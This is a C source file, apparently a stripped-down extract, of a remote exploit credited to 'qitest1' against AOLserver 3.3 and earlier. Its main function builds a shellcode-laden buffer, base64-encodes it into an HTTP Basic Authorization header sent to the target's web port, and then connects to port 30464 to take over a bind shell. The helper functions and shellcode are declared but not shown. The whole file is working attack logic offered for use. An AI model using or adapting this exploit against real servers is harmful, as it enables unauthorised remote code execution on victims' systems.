
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int zbuf ;
typedef int ubuf ;


 int FP ;
 int Ns_HtuuEncode (char*,int,char*) ;
 int SC_ADDR ;
 int exit (int) ;
 int fprintf (int ,char*,char*) ;
 int memset (char*,int,int) ;
 int printf (char*,...) ;
 int send (int,char*,int,int ) ;
 int shellami (int) ;
 char* shellcode ;
 int sleep (int) ;
 int sockami (char*,int) ;
 int sprintf (char*,char*,char*) ;
 int stderr ;
 int strlen (char*) ;
 int zbuffami (int ,int ,char*) ;

int
main(int argc, char **argv)
{
  int sock;
  char zbuf[1024], ubuf[1024], sbuf[1024];

  printf("\n  AOLserver version 3.3 and prior exploit by qitest1\n\n");

  if(argc == 1)
 {
   fprintf(stderr, "Usage: %s <target>\n", argv[0]);
   exit(1);
 }

  printf("+Connecting to %s...\n", argv[1]);
  sock = sockami(argv[1], 80);
  printf("  connected\n");

  printf("+Building buffer with shellcode len: %d...\n",
  strlen(shellcode));
  memset(zbuf, 0x00, sizeof(zbuf));
  zbuffami(FP, SC_ADDR, zbuf);
  printf("  done\n");

  printf("+Encoding buffer...\n");
  memset(ubuf, 0x00, sizeof(ubuf));
  Ns_HtuuEncode(zbuf, strlen(zbuf), ubuf);
  printf("  done\n");

  printf("+Making http request...\n");
  sprintf(sbuf,
  "GET / HTTP/1.0\nAuthorization: Basic %s\r\n\r\n", ubuf);
  send(sock, sbuf, strlen(sbuf), 0);
  printf("  done\n");

  printf("+Waiting for the shellcode to be executed...\n  0x69\n");
  sleep(2);
  sock = sockami(argv[1], 30464);
  shellami(sock);
}
